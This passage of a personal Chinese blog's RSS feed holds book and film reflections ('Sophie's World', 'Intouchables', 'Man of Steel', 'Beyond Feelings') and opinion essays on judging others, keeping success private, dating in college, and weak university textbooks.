而更有意思的是，这本书中还有一个女孩叫席德，她处于苏菲世界之外的世界，她的父亲将《苏菲的世界》当作生日的礼物送给了她，席德读了这本书后，决定帮助苏菲他们逃脱书中的世界，在她所处的世界阻拦着自己的父亲。
站在我的维度来看，席德和他父亲也是我手中这本书的作者虚构的。
这不得不让人陷入沉思：作为读者的我们，是否也是别人虚构的人物呢？
我们是否也像他们那样完全没有发现自己是被虚构的？
或者是有人已经发现了，并且像苏菲和她的哲学老师那样逃出了他们以为的“书中世界”，
实际上也只是进入了另一个虚构的世界罢了。
我无法回答，这个世界上也许也没有人能回答，但肯定有人发现，也许是那些大哲学家，比如尼采、叔本华、柏拉图。
自认为比较精彩的片段  这次他们走过所有关于超自然现象的书，停在书店最里面一个看起来不甚牢固的架子前。架子的上方挂着一块很小的牌子，上面写着：哲学类。艾伯特指着架上的一本书。苏菲看到书名时不禁吓了一跳。上面写着：苏菲的世界。
“你要不要我买一本送给你？”
“我不太敢看耶！”
 这一段我自认为是比较让人浮想联翩的，作为当事人的苏菲，又有多么的恐惧呢。
自认为书中的佳句  追寻真理的过程就像准备破解一场犯罪案件的过程，有人认为安德森是凶手，有人则认为尼博尔或法布克才是。有时警方可以侦破案件，但也可能永远无法查出真相（虽然这个真相一定存在于某个地方，但是它一定不会自己跳出来告诉你：“我是真相”。 哲学家们在成长的过程中不能习惯这世界上的一切（将世间一切当作理所当然），因为他们需要时刻保持一颗好奇心（这是极为重要的一项能力）。 大多数人都忙于日常生活的琐事，这些人对于世界的好奇心大多都受到了生活的压抑，直到生活将他们的好奇心磨灭殆尽。 神话存在的意义是为了解释当时时代人们所不了解、不理解的事物。 你知晓的一切，都不是事物本身的模样，只是大多数人所以为的模样。 在某个期间，哲学乃是男人的专利，一个妇女无论如何有思想都只能对男人俯首听命，因此许多宝贵经验就这样丧失了。 当时的人并没有现代的各种高科技电子设备可以利用，他们唯一的工具就是自己的心灵。 真正的知识来自内心，而不是得自别人的传授；唯有出自内心的知识，才能使人拥有真正的智慧。 智者是有智慧的人，而哲学家则是追求智慧的人。 诡辩家是自以为无所不知的人，而哲学家是明白自己一无所知的人。 大部分人不是太过笃定，就是漠不关心。 人只要有正确的见解，就会采取正确的行动。 一个人之所以犯错，是因为这个人不知道何者是对的。 如果你做一些自己深知不对的事，你还会活得很快乐吗？ 哲学家们对永远“真”，永远“善”，永远“美”的事物感兴趣。 对于那些不断改变的事物不可能会有真正的认识。 人既不能懦弱，也不能太过鲁莽，而要勇敢（不够勇敢就是懦弱，太过勇敢就变成鲁莽）；既不能吝啬，也不能挥霍，而要慷慨（不够慷概就是吝啬，太过慷概就变成挥霍）；饮食也是如此，既不能吃太少，也不能吃太多（吃的太少会导致太瘦，吃的太多会导致太胖）。 运用理智使自己不受当时主流思想的影响。 上帝不是一切，一切都在上帝之中。 一个人可能宁愿整个地球遭到毁灭，也不愿意直接的手指被割到。 一个人可以完全随心所欲的以自己的方式诠释生命。 万一你睡着了呢？万一你在睡眠时做梦了呢？万一你在梦中到了天堂，在那儿采下了一朵奇异而美丽的花？万一你醒来时，花儿正在手中？啊，那时你要如何呢？ “死亡和我们没有关系”，因为“只要我们存在一天，死亡就不会来临，而当死亡来临的那一刻，我们也不在存在了”；毕竟，我们好像从未听说某人得了“死亡”这种疾病。 神不足惧，死不足忧，祸苦易忍，福乐易求 所有的自然现象，比如生病与死亡，都只是遵守大自然不变的法则而已，因此他们认为人们必须学会接受自己的命运。 没有任何事情是偶然发生的，每一件事物发生都有其必要 当人在追求较短暂的快乐时，必须考虑是否还有其他方式可以获得更大、更持久或更强烈的快乐。 当我们考量一个行动是否有乐趣时，必须同时斟酌它可能会带来的副作用。 我们心中很”理所当然“的看法也不一定经得起时间的考验。 你不可能知道一个人是否爱你，你只能相信他爱你，或者，希望他爱你  </description>
    </item>
    
    <item>
      <title>《触不可及》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%A7%A6%E4%B8%8D%E5%8F%AF%E5%8F%8A/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%A7%A6%E4%B8%8D%E5%8F%AF%E5%8F%8A/</guid>
      <description>《触不可及》 影片中有一句话令我印象深刻：“只有德瑞斯没有将菲利普当作残疾人——因为他总把电话递给我，你知道为什么吗？因为他忘了我不能动。”
德瑞斯带着菲利普飚车、极限运动、抽烟，似乎完全没把菲利普当残疾人看待。
德瑞斯帮菲利普面的了菲利普一直在逃避的事——不敢与笔友埃莱奥诺在现实中见面，怕对方嫌弃自己是残疾人。
两个阶级差距巨大的人，依旧能成为朋友。</description>
    </item>
    
    <item>
      <title>《走在自己的时区里》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/essay/%E8%B5%B0%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E6%97%B6%E5%8C%BA%E9%87%8C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/essay/%E8%B5%B0%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E6%97%B6%E5%8C%BA%E9%87%8C/</guid>
      <description>《走在自己的时区里》 原文 纽约时间比加州时间早三个小时，
但加州时间并没有变慢。
有人 22 岁就毕业了，
但等了五年才找到好的工作！
有人 25 岁就当上 CEO，
却在 50 岁去世。
也有人迟到 50 岁才当上 CEO，
然后活到 90 岁。
有人依然单身，
同时也有人已婚。
奥巴马 55 岁就退休，
川普 70 岁才开始当总统。
世上每个人本来就有自己的发展时区。
身边有些人看似走在你前面，
也有人看似走在你后面。
但其实每个人在自己的时区有自己的步程。
不用嫉妒或嘲笑他们。
他们都在自己的时区里，你也是！
生命就是等待正确的行动时机。
所以，放轻松。
你没有落后。
你没有领先。
在命运为你安排的属于自己的时区里，一切都准时。
读后感 我相信你也和我一样，读完这篇短文后，心中的梦想似乎又发芽了，那团火似乎又燃了起来。
《被讨厌的勇气》一书中，有着一个非常重要概念：课题分离，在这篇短文中，用 时区分离 我觉得也没什么问题
有的人看似走到你前面，也有些人看似走到你后面，但他们都有着自己的课题，有着自己的人生，我们没必要去嫉妒他们，也没必要去可怜他们，因为这仅仅是我们的课题不同而已。
比如别人对你提出要求，你的课题是判断要不要接受 Ta 的要求，只需要就事论事做出你想做的回应就好。至于 Ta 怎么来处理你的回应，他会不会感到失望，会不会认为你太不近人情，那是他的课题了，他的课题，不在你的考虑范围之内。
阿德勒用一句话来形容课题分离，这句话是：可以把马带到水边，但不能强迫其喝水。倘若无视他人的意愿而强迫其改变，那结果只会是日后产生更加强烈的反作用。
课题，我也原称之为时区，生活在自己的时区里，一切都是准时的。
一切烦恼都来自于人际关系，而一切人际关系的矛盾都是因为对别人的时区妄加干涉或者自己的时区被别人妄加干涉。
我们所处的时区也是如此，别人在别人的时区，自己在自己的时区，我们不能让别人干涉属于自己的时区，也不要去干涉别人的时区。
共勉。</description>
    </item>
    
    <item>
      <title>《超人之钢铁之躯》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%B6%85%E4%BA%BA%E4%B9%8B%E9%92%A2%E9%93%81%E4%B9%8B%E8%BA%AF/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%B6%85%E4%BA%BA%E4%B9%8B%E9%92%A2%E9%93%81%E4%B9%8B%E8%BA%AF/</guid>
      <description>《超人之钢铁之躯》 超人出生的同时，氪星上的自然资源被耗尽了，因此导致其内核的不稳定——氪星将被毁灭。最终，氪星的将军佐德试图发起政变，但为时已晚，超人的父亲和母亲都预见了末日的降临，他们为了留下氪星上唯一的血脉，用了一些手段。
佐德想要氪星的中枢宝典，但中枢宝典似乎已经被超人的父亲植入了超人体内。超人被飞船送走了，同时佐德杀死了超人的父亲，佐德也被监禁了三百个循环年，同时也避免了被毁灭，随后，氪星爆炸了。飞船坠落到了地球&amp;hellip;
佐德想要宝典拯救氪星，但超人的父亲乔伊莱并不觉得这是一个办法，唯有让自己的儿子，唯一自然出生的氪星人带着宝典去往另一个星球。
超人在一艘穿上捕鱼，这似乎是职业？
船员处于好心救了克拉克一次，一个基地失火了，超人初显神威，将他们救了出来。
超人开始回忆童年。全班同学坐校车，校车车胎爆了，导致校车开向了河里，本该九死一生的情况，但幼时的克拉克就已经拥有了超人的部分神力，将校车推向了岸边，同时再下河将之在车上嘲笑他的小胖也救上了岸。
但这也让同学的父母还是怀疑克拉克异于常人的现象，但克拉克的父母必须极力掩饰，因为人类会恐惧未知的东西，如果让其他人知道克拉克的与众不同，那么人类也许会消灭克拉克，这一切都让克拉克听见了，他独自一人坐在皮卡车上思考着，他的养父走了过来，告诉了自己的来历，以及随他一起飞往地球的飞船和中枢宝典。当卡拉克知道自己不是地球人之后，我想他应该很伤心，我想每个人都会伤心把，因为你在这个世界上，居然没有一个同类，我想，每个人都不想成为别人眼中的异类，因为这会很孤独。
酒吧里，好友被人乱摸，克拉克上去劝阻，但似乎被当软柿子了，超人本可以直接干掉这败类，但他忍住了，出门后将他的车砸掉了&amp;hellip;
克拉克无意间来到了来自氪星的侦察艇上，并先驾驶着它离开了人类的实现范围。这艘侦察艇上残留了超人父亲乔伊莱的影子。乔伊莱便开始向解释这发生的一切&amp;hellip;氪星上的人都是人工造的，在出生前就已经被赋予了某种职业。为了改变这一切，超人凯尔诞生了，数百年来唯一一个自然出生的氪星人。乔伊莱将战衣给了超人凯尔，并告诉他——伊莱家族族徽的含义是——坚信每个人都有向善的根本信念。
凯尔开始了训练，逐渐掌握自己的超能力。
记者莱恩开始寻找克拉克，为了新闻的真实性，因为这会让她出名，但当他找到克拉克后，询问他为什么要一直逃避，为什么不去帮助人类，克拉克的回答让莱恩明白了——父亲为了不让他暴露超能力，不让他再一次成为别人眼中的异类，又或者是为了他的安全着想，他自己冒着生命危险就瞎了小狗，这里说实话有点搞笑，为了救一条狗——汉克，居然搭上了丈夫的性命，这不是闹着玩吗，也许是因为明白了父亲的良苦用心，在这之后，克拉克一直过着普通人的生活，很佩服，如果换做是我，肯定是做不到的，也许这也是为什么我不是超人的原因。别人是选择做普通人，而我确实被迫做普通人。
再次见到母亲，母亲已经快是满头白发，他告诉母亲，他找到了自己的族人，知道了自己的身世，此时的母子俩非常的开心。
”担心他们会把你从我身边夺走“母亲说，哎，也许这是我的弱点吧。
佐德终于找到了地球，找到了凯尔，他用全世界的电子设备告诉凯尔——你不是一个人。佐德用全世界的人类威胁凯尔，想让他投降，人类也开始寻找他，但不是保护，而是交出他，就是人性——善恶交织。
唯一知道凯尔身份的人——露易丝莱恩也被扣了个叛国罪&amp;hellip;将被逮捕。
克拉克再次回忆起小时候父亲对自己说的话——你得自己决定成为什么样的人，不管你成为何种人，正义或邪恶，都将改变这个世界。
回到现实，卡拉克很纠结，因为他知道佐德不可信，但他同样也不知道人类可不可信，有人告诉他——有时候你要先信任别人，才能得到别人的信任。
克拉克投降了，为了路易斯莱恩，这些人真是可笑，若不是超人愿意，你们怎么能困住超人？
克拉克和路易斯都被带上了飞船，他们都被窥视佐德窥视了记忆，而后，佐德来到了卡拉克母亲住的地方，逼问克拉克的母亲，飞船和宝典在哪里。
超人察觉到佐德可能会伤害自己的母亲，以最快的速度赶到，刚好是看到了佐德威胁母亲的一幕，直接将佐德按在地上狂打——你以为你可以困住我的母亲？超人干掉了佐德的头盔，本以为可以直接干掉佐德，但奈何佐德的部下赶来了，救了佐德一命。
超人和氪星人初次战斗，前期一打一打不过，之后超人越战越勇，二打一直接不分上下，其中一个氪星人的头盔被打破，但他们的飞船又来将他们救走了，我寻思为什么不直接用飞船的光线干超人？这样不跟家碾压？难道是为了给飞船节省能量？我暂时也只能想到这个理由了。
超人也是在初次碰撞中获得了人类的认可——他不是我们的敌人。
佐德开始改造地球，他想让地球变成氪星，这样才能复活他的族人们，从这一点来说，佐德并没有错，他一心为氪星，他配得上一星之将。
佐德以人类威胁凯尔， 最终凯尔还是杀了佐德，为了几个人类。杀死了自己最后一个同类。我也许一生都无法理解超人的这种感觉。
地球得救了，但超人却永远失去了最后一个族人。
小狗汉克也离开了这个世界。
这是一场种族之战，没有对错可言。</description>
    </item>
    
    <item>
      <title>《超越感觉》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/thought/%E8%B6%85%E8%B6%8A%E6%84%9F%E8%A7%89/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/thought/%E8%B6%85%E8%B6%8A%E6%84%9F%E8%A7%89/</guid>
      <description>《超越感觉》 前言 任何两个人都不是完全一样的，每个人观察世界时都有其独特的视角和特有的方法。
人类忽视这种主观方面的任何一个观点都是一种扭曲。
感觉和思考不是互相排斥的，它们完全是互补的，因此不必关注其中之一，从而抛弃另一个。两者都是人的自然特质。
人的思维能够超越感觉，实现清晰、公正、批判的问题解决和决策。
你是谁 世界对我们的影响远远超出了我们大多数人的认知。
时间和地点的影响 生活在不同的时代或文化背景下，会使你成为一个不同的人。
如果你成长于印度，那你也许会完全适应父母选择你的配偶。
如果你生活在殖民时期的美洲，那你可能不会反对禁止妇女从事陪审团的做法。
观念的影响 当表达一个观念时，同时也在逻辑上不可避免的传达了与此密切相关的一些观念
 给出观念：智力是由遗传决定的，并且不能增加。
教育者知道后，他们以职业课程代替了学术的课程，并且接受了教授学生们的事实而不是判断过程的方法论。
立法者知道后，决定阻止智力低下的人们进入到这个国家。
商界领袖知道后，将无需头脑的人交给智力低的人们去完成。
 你所面对的无数观念将以类似的方式（轻微的或深刻的）影响着你的信念和行为。这甚至在你未有意识地理解这些观念之前就可能发生。
因为认为很少有耐心读完一本需要思考的书籍，所以许多出版社商就用名人写的轻松消遣之作代替严肃的书籍。
大众文化的影响 电视节目制作人运用频繁的场景转换和感官诉求（如汽车碰撞、暴 力和性邂逅），以维持观众的兴趣不减。
观众么期望教室 和工作场所也提供像电视中得到的同样的连续刺激。
人们很少有耐心读完一本需要思考的书籍，所 以许多出版商就用名人写的轻松消遣之作代替严肃的书籍。
今天，政客比新闻记者更加让人生厌地操控人民。政客不是表达他 们的思想，而是调查人们想什么，并且假装分享人民的看法。
操纵的学问  所罗门·阿希（Solomon Asch）指 出，只是通过改变系列中的词序，人们的反应就能发生变化。他要求研 究的参与者用一系列形容词来评价一个人。当他把褒义形容词放在第一 位时——聪慧、勤奋、冲动、批判的、固执、妒忌——参与者给出了积 极的评价。当他调换这些词的词序，把妒忌放在第一位，把聪慧放在最 后一位时，他们给出了消极的评价。
 我们以最大的热情捍卫的许多信仰，也许就是以这种方式根 植于我们头脑中的。
舆论就像自然气候，它是如此地广泛深入人心，以至那些生活于其中、不知 道其他观点的人视之为理所当然。
心理学的影响  当孩子们觉得自己在某个课目上表现愚笨（或者在各科都愚笨）时，他们就会无意识地以行为去证实 这种自我形象。他们觉得自己愚笨，所以行动也表现得如此。这位教育 工作者推断出，正是这种失败主义的态度而不是能力上的任何缺陷破坏 了他们的努力，因而着手改变他们的自我形象。他发现，当他做到这一 点时，他们就不再表现得愚笨了。
 什么是批判性思考 许多人可能只是告诉你去思 考，却根本未解释思考是什么，以及一名好的思考者具备什么样的品 质，而这是差的思考者所缺乏的。
 生活中最有趣和令人震惊的矛盾是：一方面， 几乎所有人都不断坚持“逻辑”、“逻辑推理”和“合理推理”；另 一方面，他们却不能表现出这种能力，当别人表现出来时也不 愿接受之。
我们大多数所谓的推理在于为继续相信我们已经相信的东 西找到理由。
清晰的思考是非常罕见的事，但甚至简单清楚的思考也几 乎是罕见的。我们许多人在大多数时间里根本就不思考。我们 信奉并且感觉着，但并不思考。
思想懒惰是人最常见的特质之一。
 心智和大脑 大脑是思考的必要条件，但没有表明大 脑是思考的充分条件。</description>
    </item>
    
    <item>
      <title>《骡子》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E9%AA%A1%E5%AD%90/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E9%AA%A1%E5%AD%90/</guid>
      <description>《骡子》 </description>
    </item>
    
    <item>
      <title>不可论断他人</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E4%B8%8D%E5%8F%AF%E8%AE%BA%E6%96%AD%E4%BB%96%E4%BA%BA/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E4%B8%8D%E5%8F%AF%E8%AE%BA%E6%96%AD%E4%BB%96%E4%BA%BA/</guid>
      <description>不可论断他人 不可论断人是非常重要的原则。
但是与此同时，人却又没有办法不去论断人。
比如，你要聘用员工，你就需要在几个人中间挑一个；
比如，你要谈恋爱，你也经常需要在几个人中间挑一个；比如，你要选择供应商，你总是要在几个里面选一个。
你终究是要进行选择，终究是要进行判断，不选择、不判断，你的人生将无以继续。
而选择和判断的对象，又常常是人，这是没有办法避免的。
那么要怎么实践“不论断人”的教训？
看权柄，也就是判断权 判断之前，考虑一下此人此事你是否有判断权。
法官，对接受法律管辖的人在刑罚上有判断权；
教师，对来求学的学生在学业上有判断权；
雇主，对雇员的受雇事务有判断权……
所有的人都对所被征询之事有判断权。
你需要意识到，人有免于判断的自由，这种自由是不应侵犯的。
只有被请求判断，得到了授权，你的判断才不会被视作一种对他人自由的侵害。
你一定要在你看到某种许可证后，才开始你的判断。
这些“判断许可”，有时是通过隐式的邀约获取的，比如你是一个医生，对方来挂了号，这就是允许了你的判断。
又比如你是在知乎回答他人的一个问题，他既然问了求答，也就自然等于做了授权。
但在这其中，你要注意避免受甲的邀约去判断并未授权给他的乙。
甲邀请你去判断乙，你必须要先检查甲是否有权判断乙。
比如甲是不是乙的监护人？如果是，那是可以的。
甲是不是乙的医生？如果是，那么你是可以受邀参与关于乙的疾病会诊的。
同时，你还要检查乙给予的授权范围，考虑乙所授予甲的判断权，是否包含可以被转授的许可。
比如，在没有被授权的情况下，独立执业的心理医生是无权邀请其他人来会诊的。
但如果一名病人是去一家诊所求治，合同关系是与诊所之间签署，那么这可能包含了该诊所所有的受雇医生。
你如果也是这位医生的同事，如果你受到邀请，你也就有了判断权，
是的，关于判断权的问题就是这么微妙、复杂而又严肃。
所以出于严谨、保守起见，你最好把授权问题弄得显式和明确一些，
比如你拿不准的话就直接问一下对方是否是在求取你的关于某一方面的判断，
得不到肯定答复就干脆不继续。或者你一定要有明确预示的权柄在先，
以至于只要在这个场合下与你接触的人就等于自动声明并给予你判断权。
举个比较经典而应景的例子，你在知乎自己的回答的讨论区里，有自由删除、折叠一切回复的编辑权，
那么这就意味着在你讨论区里发表言论的人，等于自动的声明了愿意接受你的删除、折叠的判断。
在这前提下，你就可以自由行使被授予的权柄，而不必纠结对方的“抗议”
因为那本质上是对方出尔反尔，不讲信用，或者缺少对待社会契约的正确意识罢了。
那不是你的问题，你无论如何自由心证，也没有“侵犯他人自由”的问题。
在讨论区里抗议答主删除或者折叠自己的回复是一种对自己的社会责任不明了，对契约关系不敏感、对伦理认识不成熟的表现。
基于同一种规则，你去别人的答案下写长篇回复——或者哪怕一个字也罢，
你都必须做好可能被删除或者折叠的心理准备，因为对方有这完全的自由，而且你一但落笔就等于签了弃权协议。
所以明智一点说，你如果是打算去做任何可能被对方看作不礼貌的判断，
你最好是自己写一个答案，而不是去对方的答案下“要求尊重言论自由”。
解决争议的最好方式，不是去“寻求共识”，而是在各自有权柄的区域各自独裁专断，然后各安天命。
你进入我的领域，就接受我的判断，我进入你的领域，就老老实实接受你的判断。
有效的避免判断人的一个诀窍，是人要努力提高自己的判断的价值。 提高到什么程度？
提高到其他人会花钱来购买你的判断、会竞争得到你判断的机会的程度。
当你的判断对他人贵重到这个地步，你就知道珍惜自己的判断了。
你的判断是有市场价值的，你还会到处乱扔吗？对方真的配得到你的判断吗？
到了这个程度，你自然而然的不会轻易去犯判断人的错误。
何止不会犯这个错，就是对方请你开口对某个事物进行判断，
你也会苛刻的考量对方的邀请是否真的有质量——礼仪是否全备、态度是否周正、诚意是否真实——是否真的配得到。
不是三顾茅庐者，何德何能堪得三分天下之计？
而要培养出这个等级的判断力，殊非易事。你自己的学识、阅历、修养乃至信仰态度，都与你的“邀约价值”息息相关。
而这一切之中，影响最大的，是他人对你的爱和信任。
如果不是爱你或信任你，你的知识再怎么高超，又如何让人相信你的判断是有信服力的呢？
其实人为何总是要去擅夺判断的权柄？其实是出于对拥有判断权的人的艳羡。
他们太羡慕那些“一言即出，闻者服膺”的人的权柄。
却一直没明白这权柄的根源何在——并非出于你的知识与能力，而是出对判断者的爱和信任。
 让你的判断拥有动人心魄的价值的，
不是你的地位、你的文凭、你的能力、你的资格证书，
而是这背后直指人心的爱。
  我们要回到自身。
每个人都有免于人的判断的自由。
人们可以抓你、审你、判你、关你、乃至于杀你。
但只要你的内心不接受对方的审判权，那么这一切都仅仅只是暴力的不同形式，并不构成真正意义上的审判。
难不成路上出现一群强盗把你绑了去，装模作样宣判你犯有“不肯被抢劫之罪”，然后判你一个“死刑”，你就真的“有罪”吗？</description>
    </item>
    
    <item>
      <title>不要让别人知道你过得好</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E4%B8%8D%E8%A6%81%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E8%BF%87%E5%BE%97%E5%A5%BD/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E4%B8%8D%E8%A6%81%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E8%BF%87%E5%BE%97%E5%A5%BD/</guid>
      <description>不要让别人知道你过得好 一个残酷的真相是：
除了父母至亲，只有极少数的人，会无保留的为你的成就而快乐。
你跑步，瘦的是你，快乐的也是你；
你赚的钱多，钱是你的，快乐的也是你；
这样的快乐别人感受不到，也无从分享，对别人来说，你只是在展示自己的快乐而已。
你的快乐，会映射出别人的不快乐；
你的勤奋，会映射出别人的懒惰。
所以他们心里不舒服。
情商低一些的，还会说些丧气的话。
进步是你自己的事情，默默的一直进步下去吧，总有一天你会发现自己已经和他们不是一个层次的人了。</description>
    </item>
    
    <item>
      <title>为什么大学不谈恋爱</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%A4%A7%E5%AD%A6%E4%B8%8D%E8%B0%88%E6%81%8B%E7%88%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%A4%A7%E5%AD%A6%E4%B8%8D%E8%B0%88%E6%81%8B%E7%88%B1/</guid>
      <description>为什么大学不谈恋爱 我就搞不明白了，为什么上大学就非得谈恋爱不可呢？
是游戏不好玩还是手机不好玩？非要找小哥哥小姐姐安慰你那寂寞空虚的心？
你要是觉得大学就必须谈一次恋爱的话，那我问你：
大学还要好好学习呢，学习了吗？
大学还要努力实习呢，实习了吗？
大学还要加油考研究生呢，考研了吗？
大学还要四六级雅思托福出国交换呢，交换了吗？
大学可干的事情太多太多了，我就不懂了，怎么这么多人就揪住一个谈恋爱就不放了呢？
是因为大学里面的恋爱单纯不看房车？你放心，你对象不看，对象的父母也会看的。
是因为大学里面开销少，不花钱？你放心，一周开一次房的频率，你半个月生活费没了。
是因为大学里面的时间多，能多相处？你放心，时间多屁事也多，有点时间都给了吵架闹分手了。
现在谁再说大学无忧无虑的，我上去就是给你一平底锅：
这段时间，正是人生最迷茫的时刻。父母鞭长莫及管不到你。
老师，只要你来上课，其他的也都不会干涉你。没人管没人问，你能感觉到周围人都在努力，
都在给未来做打算，但是一看你，啥啥不知道，啥啥没规划。
你连自己都还没有活明白，怎么能去帮助另一个人？两个迷茫焦虑的人，又怎么能够互相拯救呢？
就像经常有大学的小学弟问我如何安慰女朋友，为什么他安慰不了？
因为他自己也不知道自己何去何从，自己也没经历过外边的磨炼，对于未来毫无概念，
他只能看着自己的另一半手足无措，不知道在她陷入情绪沼泽的时候应该做些什么。
甚至都不需要他做些什么，让他把自己照顾好都有点难——生活费晚打个两天就活不下去了，
寝室里闹点矛盾就人间不值得了，女朋友生个病意外怀个孕就吓得跟孙子一样了……
还说对那个人负责，你自己出点儿事你自己都扛不住，你还照顾另一个人？
我知道有不少的人，当初因为来到大学空虚寂寞冷，所以一时冲动谈起了恋爱，
结果在相处的时候手足无措，最后闹出了一堆矛盾，还落下了情感上面的心理阴影。
所以我和其他人说，如果大学你是要正儿八经的谈恋爱，你别着急，有就有，没有就算了呗。
因为对于不少人来说，大学是一段初恋的开始，而初恋往往意味着可能会影响你后面很多段恋情的相处方式，
对待感情的看法，甚至你以后很多择偶都会像初恋的那个模式。
因此，这是一件大事，不要跟着别人的节奏走。
没有情人，就过不了情人节了，过不了就不过呗。
难不成过清明节没死人你还得抄刀子怼死几个，就为了过节？
一个人吃饭怎么了？是拿不起来筷子了，还是端不起来饭碗了？这么期待有个人喂你，你不怕噎着？
就这么需要找个人和你一起奋斗吗？
小傻瓜，没有人有义务在你还是个生瓜蛋子的时候赌上自己的命运和前程，当你做出成绩来的时候，自然会有人来找你。
你现在迷茫，焦虑，孤单，想要找一个人的陪伴，来让她证明你存在的价值，但是你的价值根本不需要一个人来告诉你。
大学时有一位室友，四年都没有谈过恋爱，难道他就没价值了么？
相反，他相当优秀，颜值才华和人品都拥有，毕业一年在职场也是混得风生水起。
后来我们问他大学没有谈过恋爱有没有后悔，他说并不后悔，只是有些遗憾。
如果能拥有一份完美的爱情，那自然是好的，但不至于后悔，因为真的不是必须要拥有的。
如果你能遇到那个对的人，那最好，谈一场不分手的恋爱，能在大学这个象牙塔一直到结婚，是一件很美好的事情。
但是如果你没遇到那个人，那就好好努力，当你将来碰到时，你也会感激在这个时间段努力向上的自己，
正是因为你挺过了这段时间，才让你变成了更好的人，有了出现在那个人眼前的缘分。
也许，你可能还是看着校园里的情侣偷偷羡慕嫉妒，可能在心中想着要不随便先谈个恋爱吧，不然好像真的会有遗憾。
真的没有这个必要，谈恋爱这种事情，真的是将就缘分的，不要刻意去追求，不要违背自己的内心。
后来当你回过头看的时候，你会发现，其实很多事情比起恋爱，有意思多了。
所以，先做好自己，等那个人来。
你若盛开，蝴蝶自来。
你问我，万一那个人这辈子都不会出现怎么办？
傻孩子，不怕，咱到时候，有钱。</description>
    </item>
    
    <item>
      <title>为什么看不懂大学教材</title>
      <link>https://note.yxzi.xyz/note/view/society/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%9C%8B%E4%B8%8D%E6%87%82%E5%A4%A7%E5%AD%A6%E6%95%99%E6%9D%90/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/society/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%9C%8B%E4%B8%8D%E6%87%82%E5%A4%A7%E5%AD%A6%E6%95%99%E6%9D%90/</guid>
      <description>大学教材为什么看不懂 IT 界有个万人皆知的行业准则：不要重复造轮子。
它的意思是，你可以自己造的玩，但是如果人家已经有足够好的轮子，
你就不要试图，甚至是通过各种手段，试图去取代这个轮子的地位。
同理，如果某个学科已经有足够好的教材，您没那水平编出更好的教材，
就乖乖地用人家的教材就好了，这样既节省资源，同时也能保证中国学生看到的教材内的思想和国外学生是同步的。
中国的大学有个毛病，就是什么东西也想搞个自己的出来。
就比如线性代数教材，如此重要的学科，用脚趾头想也能知道，优秀的国外教材已经遍地走了，
但是各个大学仍然要请自己学校的某几个水平堪忧，语言表达能力菜得扣脚的老师来编写一个教材，
最后命其名曰——精品教材，而这些垃圾教材坑害的是一批一批的优秀学生，
当然如果这些学生能被一直坑下去的，自主学习能力也是多少有点问题&amp;hellip;
可是世界上大多数学生就是这样，他们会乖乖地去上课，听老师念 PPT，
然后认真看学校推荐用的课本，然后当这些垃圾教材搞得他们一头雾水的时候，
他们会用这门课难来安慰自己，最后学的不明不白，草草了事。
我刚来中国科学技术大学的时候，上学期的线性代数，学校用的教材就是所谓学校老师自己编的“精品教材”，
这个教材是面向非数学专业学生的，我就看了三页就已经搞不明白它在说什么了，
可以想象，这样的教材迫害了多少学生，耗费了多少学生的时间。
而且可以想象，编这本教材的老师们从中肯定可以得到补贴，能不能得到版税不清楚，
但是补贴是肯定有的，而且同时这本教材的编写也能成为所谓的资金申请的理由，
“为中国科学技术大学量身定制的教材”这句话多么好听啊，可事实上呢？
由于答主英文水平过关，当时直接去图书馆借了一本英文的线性代数教材，面向数学专业的，
从第一页开始看下去，便已停不下来，连住一看就是二三十页，看完感觉畅酣淋漓，
舒畅至极，从那以后，线性代数课我再也没去过，除了最后的考试我出席了。那次期末题不简单，我考了 95 分。
我自己知道，我并不聪明，若是我不看那本英文教材，我恐怕能考 70 分不错了。
这就是事实，还有很多例子，比如贵校叶邦角编的的《电磁学》和格利菲斯的《电动力学》在易懂性和深刻性上的巨大差异，
前者啥也看不懂，后者看的畅酣淋漓。
《大学物理》与《费恩曼物理学讲义》的惊人对比，前者看的想要睡觉，
后者看的我想要拍桌，甚至感动地流泪，甚至看完兴奋地睡不着觉。
 纸质教材？？买教材？？学校让你买教材？？没有学生买教材，那这些教材不就无法带来收入了？
教材是用来教育的？No No No, 教材是用来挣钱的，相信我。
马克思主义原理你们都上过吧？这个教材是不是必须买？它为什么不做成 PDF 版，在网上开源呢？
每年这本教材能卖一千万册吧？没这些钱谁来养那些教材编写委员会呢？
